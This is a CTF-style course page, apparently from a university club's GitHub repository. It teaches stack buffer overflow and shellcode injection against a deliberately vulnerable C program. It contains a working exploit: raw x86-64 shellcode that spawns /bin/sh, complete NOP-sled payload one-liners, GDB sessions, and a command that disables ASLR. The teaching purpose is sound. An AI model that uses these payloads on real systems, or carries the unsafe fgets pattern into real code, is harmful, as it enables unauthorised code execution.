<h1 align="center">PWN 201</h1>
  <p align="center">
  Shellcode Injection
  </p>

### Table of contents

- [Introduction](#introduction)
- [Controlling RIP](#controlling-rip)
- [Executing Shellcode](#executing-shellcode)
- [Fixing Our Shellcode](#fixing-our-shellcode)
- [Practice](#practice)
- [More Resources](#more-resources)
- [Creators](#creators)

## Introduction

In [PWN 200](https://github.com/MasonCompetitiveCyber/ctf-courses/tree/main/Pwn/PWN%20200), we had discussed a very basic buffer overflow that allowed us to redirect the control flow of a vulnerable program. The program that we had used in the [PWN 200](https://github.com/MasonCompetitiveCyber/ctf-courses/tree/main/Pwn/PWN%20200) course already had a function that called `system("/bin/sh")` for us, but what if we had a program that did not contain a call to `system("/bin/sh")`? In this course, we are going to be discussing how we can inject a custom payload that calls `system("/bin/sh")` for us into the target via a buffer overflow.

## Controlling RIP

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    char buf[100];

    printf("Enter data plz: ");
    fgets(buf, 1000, stdin);

    return 0;
}
```

The buffer overflow in this program is quite clear. We can see that there is a vulnerable call to `fgets()`, which uses a size value of 1000 instead of 100. In [PWN 200](https://github.com/MasonCompetitiveCyber/ctf-courses/tree/main/Pwn/PWN%20200), we had used trial and error to figure out the exact number of bytes necessary for us to type out in order to overwrite the return address. Here, we'll use a faster method by using the `cyclic` command, which is a part of the pwntools library. You can install it using `pip3 install pwntools`.

```sh
$ cyclic 500
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae
```

Doing `cyclic <num>` will cause a pattern of `<num>` bytes to be printed out. The pattern is created such that every four bytes are unique. We can use this pattern as input when running the program inside of GDB to easily figure out the exact bytes that are overwritting the return address.

```sh
$ gcc -o bof -fno-stack-protector -z execstack bof.c

$ gdb bof
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 10.1 using Python engine 3.9
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from bof...
(No debugging symbols found in bof)
gef➤  run
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 201/bof
Enter data plz: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae

Program received signal SIGSEGV, Segmentation fault.
0x0000555555555183 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00005555555598a5  →  0x0000000000000000
$rdx   : 0x0
$rsp   : 0x00007fffffffdfc8  →  "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
$rbp   : 0x6261616562616164 ("daabeaab"?)
$rsi   : 0x00005555555596b1  →  "aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaa[...]"
$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
$rip   : 0x0000555555555183  →  <main+62> ret
$r8    : 0x00007fffffffdf50  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$r9    : 0x00007fffffffdfa0  →  "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
$r10   : 0x6e
$r11   : 0x00007fffffffe125  →  "aaesaaetaaeuaaevaaewaaexaaeyaae\n"
$r12   : 0x0000555555555060  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfc8│+0x0000: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"    ← $rsp
0x00007fffffffdfd0│+0x0008: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0x00007fffffffdfd8│+0x0010: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0x00007fffffffdfe0│+0x0018: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
0x00007fffffffdfe8│+0x0020: "naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabza[...]"
0x00007fffffffdff0│+0x0028: "paabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaacca[...]"
0x00007fffffffdff8│+0x0030: "raabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaacea[...]"
0x00007fffffffe000│+0x0038: "taabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacga[...]"
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555178 <main+51>        call   0x555555555040 <fgets@plt>
   0x55555555517d <main+56>        mov    eax, 0x0
   0x555555555182 <main+61>        leave
 → 0x555555555183 <main+62>        ret
[!] Cannot disassemble from $PC
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bof", stopped 0x555555555183 in main (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555183 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Here, we can see that the first four bytes that `rsp` is pointing to are `faab`. We can send these four bytes back to `cyclic` to figure out exactly how many bytes cause the program to crash.

```sh
$ cyclic -l faab
120
```

If we enter 119 bytes, the program does not crash, but if we enter 120 bytes, then the program crashes.

```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*120)" | ./bof
zsh: done                python3 -c "import sys; sys.stdout.buffer.write(b'A'*120)" |
zsh: segmentation fault  ./bof

$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*119)" | ./bof
Enter data plz:
```

## Executing Shellcode

Before you move on, make sure that you've disabled ASLR using the following command:
```sh
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Unlike last time, we don't have a function like `correct()` that we can simply jump into in order to execute `system("/bin/sh")`. Instead, this time we will send the shellcode that we created in [PWN 101](https://github.com/MasonCompetitiveCyber/ctf-courses/tree/main/Pwn/PWN%20101). When we send this shellcode to the target, it will get saved inside of `buf`, so all we have to do now is replace the return address with the starting address of `buf`. When the `ret` instruction gets executed, `rip` will be set equal to the address of `buf`. Because `buf` contains our shellcode, `rip` will be pointing to our shellcode, which will cause it to be executed as if it were normal assembly instructions.

We already know that the return address comes after 120 bytes have been written to the buffer, so our next step is to find the address of `buf`. Inside GDB, we'll setup a breakpoint right after the call to `fgets()`.

```sh
$ gdb bof
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.                                                                
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 10.1 using Python engine 3.9
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from bof...
(No debugging symbols found in bof)
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000001145 <+0>:     push   rbp
   0x0000000000001146 <+1>:     mov    rbp,rsp
   0x0000000000001149 <+4>:     add    rsp,0xffffffffffffff80
   0x000000000000114d <+8>:     mov    DWORD PTR [rbp-0x74],edi
   0x0000000000001150 <+11>:    mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000001154 <+15>:    lea    rdi,[rip+0xea9]        # 0x2004
   0x000000000000115b <+22>:    mov    eax,0x0
   0x0000000000001160 <+27>:    call   0x1030 <printf@plt>
   0x0000000000001165 <+32>:    mov    rdx,QWORD PTR [rip+0x2ed4]        # 0x4040 <stdin@@GLIBC_2.2.5>
   0x000000000000116c <+39>:    lea    rax,[rbp-0x70]
   0x0000000000001170 <+43>:    mov    esi,0x3e8
   0x0000000000001175 <+48>:    mov    rdi,rax
   0x0000000000001178 <+51>:    call   0x1040 <fgets@plt>
   0x000000000000117d <+56>:    mov    eax,0x0
   0x0000000000001182 <+61>:    leave  
   0x0000000000001183 <+62>:    ret    
End of assembler dump.
gef➤  b *main+56
Breakpoint 1 at 0x117d
```

When we run the program, we'll just send a few A's to the program just so that we can see where the buffer begins.

```sh
gef➤  run
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 201/bof
Enter data plz: AAAAAAAA

Breakpoint 1, 0x000055555555517d in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdf50  →  "AAAAAAAA\n"
$rbx   : 0x0
$rcx   : 0x00005555555596b9  →  0x0000000000000000
$rdx   : 0x0
$rsp   : 0x00007fffffffdf40  →  0x00007fffffffe0b8  →  0x00007fffffffe3c3  →  "/home/nihaal/Desktop/ctf-courses/Pwn/PWN 201/bof"
$rbp   : 0x00007fffffffdfc0  →  0x0000555555555190  →  <__libc_csu_init+0> push r15
$rsi   : 0xa41414141414141  ("AAAAAAA\n"?)
$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
$rip   : 0x000055555555517d  →  <main+56> mov eax, 0x0
$r8    : 0x00007fffffffdf50  →  "AAAAAAAA\n"
$r9    : 0x00007ffff7fadbe0  →  0x0000555555559ab0  →  0x0000000000000000
$r10   : 0x6e
$r11   : 0x246
$r12   : 0x0000555555555060  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf40│+0x0000: 0x00007fffffffe0b8  →  0x00007fffffffe3c3  →  "/home/nihaal/Desktop/ctf-courses/Pwn/PWN 201/bof"      ← $rsp
0x00007fffffffdf48│+0x0008: 0x0000000100000000
0x00007fffffffdf50│+0x0010: "AAAAAAAA\n"         ← $rax, $r8
0x00007fffffffdf58│+0x0018: 0x000000000000000a
0x00007fffffffdf60│+0x0020: 0x0000000000000000
0x00007fffffffdf68│+0x0028: 0x0000000000000000
0x00007fffffffdf70│+0x0030: 0x00000000000000f0
0x00007fffffffdf78│+0x0038: 0x00000000000000c2
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555170 <main+43>        mov    esi, 0x3e8
   0x555555555175 <main+48>        mov    rdi, rax
   0x555555555178 <main+51>        call   0x555555555040 <fgets@plt>
 → 0x55555555517d <main+56>        mov    eax, 0x0
   0x555555555182 <main+61>        leave
   0x555555555183 <main+62>        ret
   0x555555555184                  nop    WORD PTR cs:[rax+rax*1+0x0]
   0x55555555518e                  xchg   ax, ax
   0x555555555190 <__libc_csu_init+0> push   r15
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bof", stopped 0x55555555517d in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555517d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Right after the call to `fgets()` has occurred, `rax` is set equal to the beginning of `buf`. Above, we can see that `rax` is equal to `0x00007fffffffdf50` (the address will likely be different on your machine). We now know that we can overwrite the return address with the beginning of our shellcode by typing in 120 bytes followed by `0x00007fffffffdf50`.

Let's go ahead and grab the shellcode that was created in [PWN 101](https://github.com/MasonCompetitiveCyber/ctf-courses/tree/main/Pwn/PWN%20101). We can add "\x" to the beginning of each byte in the shellcode by slightly modifying the for loop that was used in [PWN 101](https://github.com/MasonCompetitiveCyber/ctf-courses/tree/main/Pwn/PWN%20101).
```sh
$ for i in $(objdump -m i386:x86-64 -D final_shell |grep "^ " |cut -f2); do printf $i; done; echo
4831c04831ffb0030f055048bf2f6465762f74747957545f505e66be0227b0020f054831c0b03b4831db53bb6e2f736848c1e31066bb626948c1e310b72f534889e74883c7014831f64831d20f05

$ for i in $(objdump -m i386:x86-64 -D final_shell |grep "^ " |cut -f2); do printf \\\\x$i; done; echo
\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05
```

Let's use python to figure out the length of our shellcode.
```sh
$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44)
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> shellcode = "\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05"
>>> len(shellcode)
78
>>> 120 - 78
42
```

Our shellcode is 78 bytes, so we need an extra 42 bytes to get it up to 120 bytes. We can use 42 NOP instructions before our shellcode to get it up to 120 bytes. NOP instructions are \x90 in hexadecimal, and they do absolutely nothing. A [NOP sled](https://en.wikipedia.org/wiki/NOP_slide) is a bunch of NOPs grouped together, and putting a NOP sled at the beginning of our shellcode can make it more likely for the program to jump to the correct address. The 42-byte-long NOP sled will provide us with the perfect padding for our shellcode.

This is what our exploit currently looks like now:
```sh
python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*42 + b'\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05' + b'\x50\xdf\xff\xff\xff\x7f\x00\x00')" > test
```
This may look long and complicated, but there are only three components to this exploit:
- 42 NOP instructions
- 78 bytes of shellcode
- Return address that jumps to the NOP sled

However, when we try using this exploit, an interesting error pops up.
```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*42 + b'\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05' + b'\x50\xdf\xff\xff\xff\x7f\x00\x00')" > test

$ ./bof < test
zsh: illegal hardware instruction  ./bof < test
```

## Fixing Our Shellcode

As it turns out, there is a minor problem with our shellcode. Let's take a look at this exploit through GDB and see why we have this problem.

```sh
$ gdb bof                                                                                                132 ⨯
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 10.1 using Python engine 3.9
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from bof...
(No debugging symbols found in bof)
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000001145 <+0>:     push   rbp
   0x0000000000001146 <+1>:     mov    rbp,rsp
   0x0000000000001149 <+4>:     add    rsp,0xffffffffffffff80
   0x000000000000114d <+8>:     mov    DWORD PTR [rbp-0x74],edi
   0x0000000000001150 <+11>:    mov    QWORD PTR [rbp-0x80],rsi
   0x0000000000001154 <+15>:    lea    rdi,[rip+0xea9]        # 0x2004
   0x000000000000115b <+22>:    mov    eax,0x0
   0x0000000000001160 <+27>:    call   0x1030 <printf@plt>
   0x0000000000001165 <+32>:    mov    rdx,QWORD PTR [rip+0x2ed4]        # 0x4040 <stdin@@GLIBC_2.2.5>
   0x000000000000116c <+39>:    lea    rax,[rbp-0x70]
   0x0000000000001170 <+43>:    mov    esi,0x3e8
   0x0000000000001175 <+48>:    mov    rdi,rax
   0x0000000000001178 <+51>:    call   0x1040 <fgets@plt>
   0x000000000000117d <+56>:    mov    eax,0x0
   0x0000000000001182 <+61>:    leave
   0x0000000000001183 <+62>:    ret
End of assembler dump.
gef➤  b *main+62
Breakpoint 1 at 0x1183
gef➤  run < test
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 201/bof < test

Breakpoint 1, 0x0000555555555183 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0xfbad20a8
$rdx   : 0x0
$rsp   : 0x00007fffffffdfc8  →  0x00007fffffffdf50  →  0x9090909090909090
$rbp   : 0x50fd23148f63148
$rsi   : 0x00005555555596b0  →  0x9090909090909090
$rdi   : 0x00007ffff7fb0680  →  0x0000000000000000
$rip   : 0x0000555555555183  →  <main+62> ret
$r8    : 0x00007fffffffdf50  →  0x9090909090909090
$r9    : 0x00007ffff7fadbe0  →  0x000055555555a6b0  →  0x0000000000000000
$r10   : 0x6f
$r11   : 0x246
$r12   : 0x0000555555555060  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfc8│+0x0000: 0x00007fffffffdf50  →  0x9090909090909090    ← $rsp
0x00007fffffffdfd0│+0x0008: 0x00007fffffffe000  →  0x0000555555555060  →  <_start+0> xor ebp, ebp
0x00007fffffffdfd8│+0x0010: 0x0000000100000000
0x00007fffffffdfe0│+0x0018: 0x0000555555555145  →  <main+0> push rbp
0x00007fffffffdfe8│+0x0020: 0x00007ffff7e157cf  →  <init_cacheinfo+287> mov rbp, rax
0x00007fffffffdff0│+0x0028: 0x0000000000000000
0x00007fffffffdff8│+0x0030: 0x906de56d2acfbc37
0x00007fffffffe000│+0x0038: 0x0000555555555060  →  <_start+0> xor ebp, ebp
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555178 <main+51>        call   0x555555555040 <fgets@plt>
   0x55555555517d <main+56>        mov    eax, 0x0
   0x555555555182 <main+61>        leave
 → 0x555555555183 <main+62>        ret
   ↳  0x7fffffffdf50                  nop
      0x7fffffffdf51                  nop
      0x7fffffffdf52                  nop
      0x7fffffffdf53                  nop
      0x7fffffffdf54                  nop
      0x7fffffffdf55                  nop
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bof", stopped 0x555555555183 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555555183 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

When we initially set a breakpoint at the `ret` instruction, we can see that everything looks fine. We have overwritten the return address with the address of a NOP sled followed by our shellcode, and we should be able to step through each instruction (using the `si` command) without any problem. Nonetheless, when we actually get through the NOP sled and start executing our shellcode, we start to see some interesting behavior.

```sh
0x00007fffffffdfb6 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x3b
$rbx   : 0x68732f6e69620000
$rcx   : 0x00007fffffffdf9c  →  0xdb31483bb0c03148
$rdx   : 0x0
$rsp   : 0x00007fffffffdfb8  →  0x0000000000000000
$rbp   : 0x50fd23148f63148
$rsi   : 0x2702
$rdi   : 0x00007fffffffdfc0  →  "/dev/tty"
$rip   : 0x00007fffffffdfb6  →  0x0000000000002fb7
$r8    : 0x00007fffffffdf50  →  0x9090909090909090
$r9    : 0x00007ffff7fadbe0  →  0x000055555555a6b0  →  0x0000000000000000
$r10   : 0x6f
$r11   : 0x346
$r12   : 0x0000555555555060  →  <_start+0> xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdfb8│+0x0000: 0x0000000000000000   ← $rsp
0x00007fffffffdfc0│+0x0008: "/dev/tty"   ← $rdi
0x00007fffffffdfc8│+0x0010: 0x0000000000000000
0x00007fffffffdfd0│+0x0018: 0x00007fffffffe000  →  0x0000555555555060  →  <_start+0> xor ebp, ebp
0x00007fffffffdfd8│+0x0020: 0x0000000100000000
0x00007fffffffdfe0│+0x0028: 0x0000555555555145  →  <main+0> push rbp
0x00007fffffffdfe8│+0x0030: 0x00007ffff7e157cf  →  <init_cacheinfo+287> mov rbp, rax
0x00007fffffffdff0│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7fffffffdfa9                  push   0x10e3c148
   0x7fffffffdfae                  mov    bx, 0x6962
   0x7fffffffdfb2                  shl    rbx, 0x10
 → 0x7fffffffdfb6                  mov    bh, 0x2f
   0x7fffffffdfb8                  add    BYTE PTR [rax], al
   0x7fffffffdfba                  add    BYTE PTR [rax], al
   0x7fffffffdfbc                  add    BYTE PTR [rax], al
   0x7fffffffdfbe                  add    BYTE PTR [rax], al
   0x7fffffffdfc0                  (bad)
──────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "bof", stopped 0x7fffffffdfb6 in ?? (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7fffffffdfb6 → mov bh, 0x2f
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

When we first start stepping into the shellcode using the `si` command, it appears as though everything is working properly. However, after stepping through a few instructions, we can see that our shellcode is getting modified for some unknown reason. For example, starting at line `0x7fffffffdfb8`, we see `add` instructions that were not a part of our original shellcode. We also see an invalid instruction at line `0x7fffffffdfc0`.

Why has our shellcode been modified? Let's examine what the values are at the line `0x7fffffffdfb8` to answer this question. We can print out the exact bytes at that line by using the `x/<num>` command, where `<num>` is the number of values that should be printed out.

```sh
gef➤  x/10 0x7fffffffdfb8
0x7fffffffdfb8: 0x0000  0x0000  0x0000  0x0000  0x642f  0x7665  0x742f  0x7974
0x7fffffffdfc8: 0x0000  0x0000
```

Don't some of these bytes look familiar to you? Recall that "/dev/tty" written in ASCII is `0x2f 0x64 0x65 0x76 0x2f 0x74 0x74 0x79`. In our shellcode, the "/dev/tty" string was something that was supposed to be pushed onto the stack so that we could get a pointer to it when calling `sys_open()`. What we're actually seeing above is the "/dev/tty" string written in little endian format.

Our shellcode is located inside of `buf`, which is allocated on the stack. Whenever we're pushing something else onto the stack, we're actually causing an issue where we're pushing things directly onto our shellcode. This is what causes our shellcode to get modified at runtime. As further evidence that we're pushing things directly onto our shellcode, if you take a look at the value of `rsp`, you'll notice that it always seems to be pointing to a value inside of `buf`.

This should be an easy fix. All we have to do is subtract a large enough value from `rsp` so that we're no longer modifying our shellcode by accident. We can quickly write some extra shellcode to subtract `rsp`. (We'll just subtract from `sp` instead of `rsp` to avoid creating NULL characters).

```sh
$ cat rsp.asm
section .text
sub sp, 300

$ nasm -f elf64 -o rsp.o rsp.asm

$ objdump -D rsp.o -M intel

rsp.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   66 81 ec 2c 01          sub    sp,0x12c
```

Now we need to add `\x66\x81\xec\x2c\x01` to the beginning of our shellcode. We also need to remove 5 NOPs to account for the fact that we've increased the size of our shellcode by five bytes. This gives us the exploit shown below, which contains the following three components:
- 37 NOP instructions
- 83 bytes of shellcode
- Return address that jumps to the NOP sled

```sh
python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*37 + b'\x66\x81\xec\x2c\x01\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05' + b'\x50\xdf\xff\xff\xff\x7f\x00\x00')" > test
```

We can use this information to get a shell from within GDB.
```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*37 + b'\x66\x81\xec\x2c\x01\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05' + b'\x50\xdf\xff\xff\xff\x7f\x00\x00')" > test

$ gdb bof
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
77 commands loaded for GDB 10.1 using Python engine 3.9
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from bof...
(No debugging symbols found in bof)
gef➤  run < test
Starting program: /home/nihaal/Desktop/ctf-courses/Pwn/PWN 201/bof < test
process 3375 is executing new program: /usr/bin/dash
$ ls
